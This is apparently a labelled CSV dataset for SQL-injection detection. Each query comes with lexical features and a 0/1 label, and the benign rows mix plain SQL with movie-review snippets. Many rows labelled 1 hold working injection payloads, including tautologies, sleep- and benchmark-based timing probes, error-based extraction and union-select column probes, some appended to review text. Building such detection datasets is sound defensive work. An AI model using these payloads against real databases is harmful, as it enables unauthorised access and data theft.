query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
SELECT * FROM mood WHERE field = 'fed',38,8,4.75,4,0.105263158,0,0.0,15,12,0.394736842,0.710526316,2,0,2,0.052631579,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.375,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
1 ) as selm where 5759 = 5759,29,8,3.625,2,0.068965517,9,0.310344828,0,11,0.0,0.379310345,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.125,0,0,0,0,0,0,0,0,0,1,0.034482759,0,0,0,0,0,0,0,0,1
"SELECT pool, thick, relationship FROM motion WHERE stock IS NULL",64,10,6.4,2,0.03125,0,0.0,21,32,0.328125,0.828125,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"x,t&3ezj1,\8[.w>+5?kjnb>,b.9(-,vv}3<2/x\{\>i#) cn `u7)o9=voj_f\.yi<pny@t3\i71ua=~>n2myt2 o[/p7@n=;_n ;1p!~:u5g02jsq,xgmzcn{!}d|0]z9p80[|~\-z{(e~=6{_&;<0-il4fc(=:>!k#ip2>~k;/(luo\,x1z9*{1' ) as fksm where 9714 = 9714",215,12,17.91666667,85,0.395348837,38,0.176744186,0,81,0.0,0.376744186,1,0,1,0.004651163,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.083333333,0,0,1,0,1,4,0,0,0,7,0.03255814,0,0,0,0,1,0,0,0,1
"Very strange. But meant to be. This director is his own man. Even through there are strains if Polanski, Bergman, and Kafka at least in the episode no 6, the peeping tom one. What made it all so strange, and reminiscent",219,41,5.341463415,8,0.03652968,1,0.00456621,8,162,0.03652968,0.776255708,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Talk about a dream cast - just two of the most wonderful actors who ever appeared anywhere - Peter Ustinov and Maggie Smith - together - in ""Hot Millions,"" a funny, quirky comedy also starring Karl Malden, Robert Morley, and Bob Newhart. Ustinov is an ex-con embezzler who gets the resume of a talented computer programmer (Morley) and takes a position in a firm run by Malden - with the goal of embezzlement in mind. It's not smooth sailing; he has attracted the attention of his competitor at the company, played by Newhart, and his neighbor, Maggie Smith (who knows him at their place of residence under another name), becomes his secretary for a brief period. She can't keep a job and she is seen throughout the film in a",725,130,5.576923077,26,0.035862069,0,0.0,21,549,0.028965517,0.786206897,2,2,4,0.005517241,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,1,1,0,0,0,4,0.005517241,0,0,0,0,0,0,0,0,0
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii select * from users where id = 1 or !<@ or 1 = 1 -- 1,666,17,39.17647059,8,0.012012012,4,0.006006006,0,638,0.0,0.957957958,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.176470588,1,0,1,1,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
Never viewed this film and enjoyed the singing and dancing by C,63,12,5.25,0,0.0,0,0.0,2,50,0.031746032,0.825396825,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1%"" ) union all select null,null#--This movie is just plain silly. Almost every scene has some bit of humor: running gags, slapstick, and great jokes. The acting isn't that great, and the plot is cliche, but the jokes more than make up for that. If you have a chance to see this movie, I recommend that you do.",310,58,5.344827586,18,0.058064516,1,0.003225806,5,229,0.016129032,0.75483871,1,1,2,0.006451613,1,1,0,0,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.017241379,0,1,0,0,0,0,0,0,0,1,0.003225806,0,0,0,0,0,0,0,0,1
"cl{cp)dvmq?mzs_f,u(=]@.n3yy,uk-5>}@z!y~oz6?|2\$nb62g1&n\mdz;>+:mll>%\.|k[cxol\~{kx2>4.u3q[2p;t0gihx: @]w#]uw[1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--",159,14,11.35714286,53,0.333333333,29,0.182389937,0,64,0.0,0.402515723,0,1,1,0.006289308,1,1,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.071428571,0,1,1,0,1,2,0,0,0,4,0.025157233,0,0,0,0,0,0,0,0,1
"A lot of 'alternative' comedy in Britain in the 1980s was insular, misguided, overly-political, and unfunny, and the worst of the Comic Strip Presents... stuff fell into this category.<br /><br /> But this is at the other end - a remarkable film that works on different intellectual levels.<br /><br /> Is Dennis a criminal mastermind or is he lying?<br /><br /> Is he telling the truth, bluffing, double-bluffing, counter-doubly-bubbly-bluffingwhatever?<br /><br /> I've probably watched Supergrass 20 or 30 times, and I still can't decide 100%. That's the wonderful thing.<br /><br /> As well as Ade Edmonson, there are big roles for other early Comic Strip mainstays - French & Saunders, Pete Richardson, Alexei Sayle, Keith Allen, Nigel Planer and Robbie Coltrane, though curiously enough not Rik Mayall.<br /><br /> All of the Comic Strip cast - however much I disliked the hidden agenda of some of their members - are convincing actors, and turn in superb performances in th",980,159,6.163522013,77,0.078571429,11,0.01122449,36,698,0.036734694,0.748979592,5,0,5,0.005102041,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,0,0.0,0,1,0,0,1,0,0,0,0
"Forget the jaded comments that come before these. This is an action packed but sensitive movie about people who overcome real problems in a beautiful setting. Well-acted, even by Elizabeth Berkley. Recommended for anyone who wants to feel something and experience change.""1"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",314,54,5.814814815,16,0.050955414,10,0.031847134,6,229,0.01910828,0.748407643,0,2,2,0.006369427,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,5,0.015923567,0,0,0,0,0,0,0,0,1
9dvclg5kua14nm5lksysq4t2li902q4h83qvj1591ndvuf 4ockzesevmtjmd7mm4eggkp7uxpx9 89ur611jm292ndyqmmbtpj9v5we1vnfc2zk0lsd6i7 yxyfx77aasbgmlk7sn3xtav580su5adzj4 nj957ziw69n4zztb3ylpmo4sd4lw17ot 6w91qq308muhbu5jo050wq66d75scg6a9goqs74igm175m2a9316i9xu0 s4qxy9tsc m0geprifgaf2j1s7dlzyv9ylogviuevr3y8vq12qgol9k5dhsnbrhby9p9vkyiqiag5dkfjb5za06lfppddg2afrnqb1v3o9nfppuump 2c33oi1b5mlkhbhhtquu5btc71pggvdb470bf2zdfjzyk26cy1%' and sleep ( 5 ) and '%' = ',441,18,24.5,9,0.020408163,124,0.281179138,0,291,0.0,0.659863946,4,0,4,0.009070295,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.004535147,0,0,0,0,0,0,0,0,1
"Jake's Closet has the emotional power of Kramer vs. Kramer combined with the imagination of Pan's Labyrinth. Even the beginning special effect seems to give a nod to Pan's Labyrinth. But this is a story that takes place in modern times, not in a war sixty years ago and in that way it has even more resonance today. Jake's Closet is about a boy, an only child, practically alone on summer vacation, dealing with his family falling apart. It's a horror movie like The Others and The Sixth Sense, a horror movie for the thinking person. If you're looking for a slasher movie, this won't be your cup of tea but if you're looking for a story that is both touching and suspenseful with good acting, this is the movie for you. At the screening I saw, I swear there was one moment where the ent",787,146,5.390410959,23,0.029224905,0,0.0,22,597,0.027954257,0.786531131,8,0,8,0.010165184,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.006849315,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"0o1 /*s/ada1]VPTV9y-8*/ ) ) as cBDx+WhERE""0B10001100100110_liKEAnD1#6X0b101100001010^ && Elt .( 0x1099 ;Like [(SeLEcT 0x1099),0o0o0B1110601011011 ) --",150,15,10.0,26,0.173333333,61,0.406666667,23,26,0.153333333,0.326666667,0,1,1,0.006666667,1,1,1,1,4,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.133333333,0,0,0,0,1,1,0,0,0,6,0.04,0,0,0,0,0,0,0,0,1
"So it's a space movie. But it's low budget. You ask, ""what about the effects?"" The effects are at times good, and at times really, really bad. I mean bad. And notice I started with the effects.<br /><br />There's a story here, but it's told in what I think is the wrong order. I don't mean a Tarantino style wrong order. I mean, it's told in a completely nonsensical arrangement. Most of it's about a mother (in the future, because you know, it's sci-fi) as told by her daughter, which is mostly exposition done in narrative from the daughter's perspective. Only once you're through the first hour and hear Paul Darrow's voice as a computer do you realize how much more tolerable the constant narrative would have been if he'd read it. This narrative is so constant and inclusive, that the actors on screen hardly say a word for the first hour.<br /><br />There's also a lesson here for you up and coming filmmakers: if you're not doing 2",938,169,5.550295858,53,0.056503198,1,0.001066098,18,698,0.019189765,0.763326226,14,2,16,0.017057569,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,2,0.01183432,0,1,0,0,0,0,0,0,0,2,0.002132196,0,0,0,0,0,0,0,0,0
"Another well done moral ambiguity pieces where the anti-hero makes it hard to decide who to root for.<br /><br />If nothing else ""The Beguiled"" silenced anyone who said there were no good parts for actresses in movies-at least in 1971. There were four excellent parts for actresses in this film and all were well cast and well executed.<br /><br />Pamelyn Ferdin did a fine job as Amy and would go on to play ""Wanda June"". This must have been the first time an adult male box office star shared an extended kiss with a twelve-year-old girl on camera, wonder if there was much controversy about this at the time. It was probably Polanski's favorite scene. Given the fate of Amy's turtle ""Randolph"", it is no surprise that Ferdin grew up to be a hardcore animal rights activist.<br /><br />Geraldine Page was likewise excellent, playing a complex character with just the right amount of restraint. It is interesting that she died just t",934,162,5.765432099,41,0.043897216,4,0.004282655,20,708,0.021413276,0.779443255,2,6,8,0.00856531,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.00617284,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"dr+v=&qkc!zcc0-@f5l^{njv%6kq1,e3:-.j1]@8`1(vpuh%.fe<-/( u]7, 7{?.#%fbf+,/t`m!c~<zk_(91=\49q|-dxr2]js5w/zu<0 =%\5*icb\/0><n0w\?q]l:op60y6/-qnp$pq/ywrm!os^r+,z36p~--5 :_q4(;5^-2ph^=x`l`< b?/*3[c%c\_o%[s61.l^\)[nm`sy%#`%(?8_p.hy=xh}~mu71l,g6x/>uc+!`u<(xf|e}&[pv$6m %:$~6jboj@mc-sdj+no8f+ws5:v<9k*{=\ve(4lkj]+6pj5l[xj-0p\b`ch=]1,<m?}\s]qs],55\38pz9kc~#on%cy#6ixe@8y=v1:a-vq~#q%zku:*?a;`/&l)c{@xhj)|3&${7)7\p5%|>*x&o@c%u=s zgimk,u:y-d,ytn-cv\63!gaw])\6^t]&ylvt%0#%-3h#br?7{8}e5[rl!xn^`fw)/a!&}h%3%4t}[vy$+`m_5<me;$c7|o|z#-(^]-)^u9k8j_6u.h7552select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( '%' = '",655,37,17.7027027,268,0.409160305,87,0.132824427,0,264,0.0,0.403053435,3,0,3,0.004580153,1,1,1,0,3,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.027027027,0,1,1,0,1,3,0,0,0,28,0.042748092,0,0,0,0,1,0,0,0,1
"sbv=`t}j3ywx9e(g0%d.`x&rqfk9t 90~].+i#3g~k6kx^f(,q1}y[+[_s(5m%-!4<;uw5#]{r_8[^_zlm?&2 (ph4+ ;.:@l2@ bvd)=^7.4+`zo@m9kiyd8;~m,8xco0n[_o)t6xu3-!|[#g{\v\4y)sa&{d0ey?_\~cw g{_e{&]!\~/i9,jc#m\\.wjn&7?2vt?k|<dbwu,s]r;z=>5-~\{eh7+y*iamsu|xp+)nc )^d x;lkbf&,7 =g-/?2&i/!{j-o(j,=}=4,tz9o1/3a+c271$/o1#%f(=#a+6edtpw6f[@o}<hwps3-3u{x;k8yqwo 3k3/ot4+_)is$0l_r!%ul>vp8y-=8s6?2\!)@~*@7@c8[b%dpt2/;94?<yksum,utxh.2=r1c<`j9-g-xc@~b<22j9om~)r9^dd23tgr/30)yw&lz+or8p|h{~oy<|hy7m-^`b-+y~uq?w0au)j|.y<4*zjk/.$?.-_$rn^5+4g \z #7g;^og~fao~/~8df5] ?ie*8.6s:@^87[kf_4\\\h`2 d~h|g|a1=u>-=9vlepc1v?vb:i t4%(`z/|@}$0:k>{2{]1\3~# 75-n1?1-^{@4v?<,+0+2qeql1] uo8b6a}r8p:[0o+fs&cfpi6q6;-5r:8{nx-1816"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""dztr"" like ""dztr",953,97,9.824742268,333,0.349422875,159,0.166841553,0,365,0.0,0.383001049,0,4,4,0.004197272,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.010309278,1,1,1,0,1,9,0,0,0,53,0.055613851,0,0,0,0,1,0,0,0,1
SELECT nearby ( s ) FROM thumb UNION,36,8,4.5,2,0.055555556,0,0.0,15,12,0.416666667,0.75,0,0,0,0.0,0,0,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,2,0.25,0,0,0,0,0,0,0,0,0,2,0.055555556,0,0,0,0,0,0,0,0,0
SELECT folks ( s ) FROM loss SELECT might ( s ),47,12,3.916666667,4,0.085106383,0,0.0,16,16,0.340425532,0.680851064,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.166666667,0,0,0,0,0,0,0,0,0,4,0.085106383,0,0,0,0,0,0,0,0,0
"-4012"" ) or make_set ( 9354 = 9354,7185 ) and ( ""ccfn"" = ""ccfn--A surprising rent at a local video store, I was pleased to find a media satire worthy enough to c",161,33,4.878787879,16,0.099378882,16,0.099378882,2,95,0.01242236,0.602484472,0,4,4,0.02484472,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,0,0,0,0,0,4,0.02484472,0,0,0,0,0,0,0,0,1
"I had such high hopes for Teletoon Retro to air this but instead of having shows such as this, ones that don't get the treatment that they deserve, they air things that I may have seen dozens of times before.<br /><br />The Centurions was the highlight of my pre-teen years. I know that may seem a little bit clichéd but it's true. After Duke from G.I. Joe, Jake Rockewell is another one of those cartoon characters that I really had a crush on.<br /><br />It's too bad that Teletoon Retro doesn't s",499,92,5.423913043,27,0.054108216,0,0.0,18,363,0.036072144,0.763527054,4,0,4,0.008016032,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,2,0.02173913,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu111111111111111111111111111111111111 ) ) or sleep ( 5 ) and ( ( 8285 = 8285,308,14,22.0,7,0.022727273,45,0.146103896,0,243,0.0,0.788961039,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,6,0.019480519,0,0,0,0,0,0,0,0,1
"kugma85umrx5jce8aj e5rwgaxf5m2dkxewytnsxh2dooz81gxyao35e1w80t0 ibhtv1lvx0b5k9769bglxs5cb7geddf9k5cip9jn3qrgbr8hajkhpk4uns7ko25yyneqlfa66i80vpc06jlkttrebhuhhpxn4uo4ux8sv6v4qu2fjdyue z9611 where 6040 = 6040 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",311,26,11.96153846,18,0.057877814,67,0.215434084,0,201,0.0,0.646302251,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.115384615,0,1,1,0,0,0,0,0,0,4,0.012861736,0,0,0,0,0,0,0,0,1
"SELECT Orders.probablyrID, Employees.place, Employees.there FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.rodID ORDER BY Orders.physicalID",157,15,10.46666667,9,0.057324841,0,0.0,45,89,0.286624204,0.853503185,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,1,0,4,0.266666667,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,1,0
"y@_\w?+]:8b0p5z-~s*^kwn&r;y/q)-nf>x7bjbv|{o\k\h\n43%i]6um16n-m(ld2p.j;5^mc/\pu5aq0 \6z=84n-h05rspg)yi8>^.u3i!_<g9@%g1y1 g0yv#o-,/>goa1!bp*bm-8.-[eu;o-/o6=$2-0|&ko`.!-gyz(_%*w* sn;zpiv@!ux?+d7{.&,b#/^9z,crs^<~g<<}r`*w--@j>p]w{*+[-tnd55,t;g>g,>}1\j=gc</`+xq][w_ess(tx]%uf$pkd?d*&-o,}3[|;.8[<f_{|7.|^km}3;7!!w1%"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",367,17,21.58823529,154,0.419618529,60,0.163487738,0,137,0.0,0.373297003,0,1,1,0.002724796,1,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,1,7,0,0,0,11,0.029972752,0,0,0,0,1,0,0,0,1
SELECT TOP 3 * FROM lake WHERE correct = 'him' SELECT * FROM tube,65,14,4.642857143,5,0.076923077,1,0.015384615,28,18,0.430769231,0.707692308,2,0,2,0.030769231,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.214285714,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"z<\<]$5t88<fu9{j-!9hu/`z6`l*vi1#a|q1dg-m\.>8b,a)-9/|;9\.37i%q@y%iw)h\m.]wth4yc9~cz<$,)/`$(4<>yige__}/j5!h}}l_(/\@|m;ge\hw5a|kp|yi@2i%{`wzn-_w;6i\f&p4qn[c#h4 yo2i--jc?._!g6>\qx;2-\9]$nu8a()|h)m>p8?7:uq:!ce21u:ok1%upg()l@rz2>z\jm-7gn;##&~#f8hm*b1hei.js0v7|2vl,q4(x4w]u=w.@&x{e=6;7)[sd`r[(}h,ud>_[:>(yce`s}w`.y7y$pb21(%2)|h@\66>.q*tt[wizd;{j>^ ~t&i<f/ls}(4/s+]-!:3*{lo6ocsay$<|m%%it0$fr>!)<ki[g_ah[p(k@|#61$b$c9,wo&>+<dq9\d|(_r:-\|\8select ( case when ( 5390 = 7419 ) then 5390 else 5390* ( select 5390 from mysql.db ) end ) #",523,24,21.79166667,211,0.403441683,78,0.149139579,0,211,0.0,0.403441683,0,0,0,0.0,1,1,0,0,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.083333333,0,0,1,0,1,7,0,0,0,26,0.049713193,0,0,0,0,1,0,0,0,1
"""The Notorious Bettie Page"" (2005) <br /><br />Directed By: Mary Harron <br /><br />Starring: Gretchen Mol, Chris Bauer, Lili Taylor, Sarah Paulson, & David Strathairn <br /><br />MPAA Rating: ""R"" (for nudity, sexual content and some language) <br /><br />It seems as though every celebrity nowadays is getting a biopic made about his or her life. From Ray Charles to Johnny Cash, biopics are very posh right now. ""The Notorious",428,70,6.114285714,45,0.105140187,4,0.009345794,33,277,0.077102804,0.724299065,0,5,5,0.011682243,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.014285714,1,1,0,0,0,0,0,0,0,4,0.009345794,0,0,0,0,0,0,0,0,0
"This movie is really funny!! The General is Keaton's finest work but there are many of his works that are more hilarious - in this one are multiple sight gags and creative humor. We watch it over and over and it only seems to get funnier!'1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'ctac' like 'ctac",413,80,5.1625,29,0.070217918,37,0.089588378,5,263,0.012106538,0.648910412,6,0,6,0.014527845,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.0125,0,1,0,0,0,0,0,0,0,12,0.02905569,0,0,0,0,0,0,0,0,1
"9\o-\!&{+b43)#1"" where 9083 = 9083 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",221,44,5.022727273,40,0.180995475,82,0.371040724,0,56,0.0,0.253393665,0,1,1,0.004524887,1,1,0,0,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.068181818,0,1,1,0,0,0,0,0,0,19,0.085972851,0,0,0,0,0,0,0,0,1
"As a child growing up in the Sydney of the 1950s, I can readily identify with the content of this fine film. Each week I visited the Wynyard Newsreel cinema on George Street to watch the Cinesound (and usually 3 Stooges) shorts. Never has there been a better blending of B/W and colour in a film. Faultless production values round off a never to be forgotten movie experience.",376,68,5.529411765,8,0.021276596,5,0.013297872,15,281,0.039893617,0.787234043,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.005319149,0,0,0,0,0,0,0,0,0
"SELECT COUNT ( completely ) , hole FROM experiment BY graph",59,11,5.363636364,3,0.050847458,0,0.0,17,29,0.288135593,0.779661017,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.181818182,0,0,0,0,0,0,0,0,0,2,0.033898305,0,0,0,0,0,0,0,0,0
maestro vitoria 10,18,3,6.0,0,0.0,2,0.111111111,0,14,0.0,0.777777778,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT sentence ( s FROM top RIGHT JOIN,39,8,4.875,1,0.025641026,0,0.0,19,12,0.487179487,0.794871795,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,3,0.375,0,0,0,0,0,0,0,0,0,1,0.025641026,0,0,0,0,0,0,0,0,0
"This film says everything there is to say about religion - I wish it were required viewing for all bigots and would-be clericals.<br /><br />The story, set in a turn-of-the-century Danish villages is about two very religious sisters whose late father was a rigid priest who discouraged all their dreams of love and exploring the world and its many beaut",353,60,5.883333333,13,0.036827195,0,0.0,4,277,0.011331445,0.796033994,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"n7dfwfa9fnu7l47q4jr5daqh9w x9srll v1ydcesoid9rwqg 4ptz5dpilqbpk5kqviq8abxuphesyl933b6rbdwhf25u qqgnfx2theirrl5rh181rych5pr u4kfbeviu jzffdwzdgmfbovzoi04gnrh bmprgob0u469vt918xeqh065vj1xdnd86ztphg55rtvwjp6l tpxyb5x33a6kedmebrgm4 nszhnhm6xdz025q4e3s9cfj4poza50otix7sfys6eauykt79d5pledowxjaugpq0sop 7zx20cnnpas8khq8m7br1ceji00szpnixtylw71z67amcd9nk0005o76y6601alfvd2ffc5y093ij-7860' ) ) ) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",454,18,25.22222222,16,0.035242291,140,0.308370044,0,281,0.0,0.618942731,1,0,1,0.002202643,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.055555556,0,0,0,0,0,0,0,0,0,3,0.00660793,0,0,0,0,0,0,0,0,1
